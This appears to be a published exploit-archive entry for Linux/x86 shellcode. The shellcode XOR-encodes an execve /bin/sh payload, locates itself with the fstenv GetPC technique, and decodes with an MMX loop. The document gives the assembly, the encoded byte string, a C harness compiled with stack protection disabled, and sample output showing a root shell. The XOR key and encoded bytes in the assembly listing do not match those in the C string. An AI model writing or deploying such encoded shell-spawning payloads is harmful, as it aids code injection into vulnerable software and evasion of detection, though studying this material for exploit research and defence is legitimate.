# Exploit Title: Linux/x86 - execve /bin/sh Shellcode (fstenv eip GetPC technique) (70 bytes, xor encoded)
# Date: 09/06/2021
# Exploit Author: d7x
# Tested on: Ubuntu x86

/***
	shellcode with XOR decoder stub and fstenv MMX FPU
	spawning a /bin/sh shell

	uses the fstenv GetPC technique to get the memory address dynamically
	(alternative to jmp-call-pop)

	Usage: gcc -fno-stack-protector -z execstack -o mmx-xor-decoder_eip mmx-xor-decoder_eip.c
	./mmx-xor-decoder_eip
	Shellcode Length: 70
	# id
	uid=0(root) gid=0(root) groups=0(root)
	# ps -p $$
	  PID TTY          TIME CMD
	24045 pts/4    00:00:00 sh

	*** Created by d7x
		https://d7x.promiselabs.net
		https://www.promiselabs.net ***
***/

/***
; shellcode assembly

global _start

section .text
_start:
	fldz
	fstenv [esp-0xc]
	pop edi 	; put eip into edi
	add edi, 37 	; offset to shellcode decoder stub, 0x08048085-0x8048060 (decoder_value, fldz)

	lea esi, [edi + 8]
	xor ecx, ecx
	mov cl, 4

decode:
	movq mm0, qword [edi]
	movq mm1, qword [esi]
	pxor mm0, mm1
	movq qword [esi], mm0
	add esi, 0x8
	loop decode

	jmp short EncodedShellcode

shellcode:

	decoder_value:	  db	0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d
	EncodedShellcode: db	0x4c,0xbd,0x2d,0x15,0x52,0x52,0x0e,0x15,0x15,0x52,0x1f,0x14,0x13,0xf4,0x9e,0x2d,0xf4,0x9f,0x2e,0xf4,0x9c,0xcd,0x76,0xb0,0xfd ; xored against 0x7d

***/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";

void main(void)
{
	printf("Shellcode Length: %d\n", strlen(shellcode));

	int(*ret)() = (int(*)())shellcode;

	ret();

}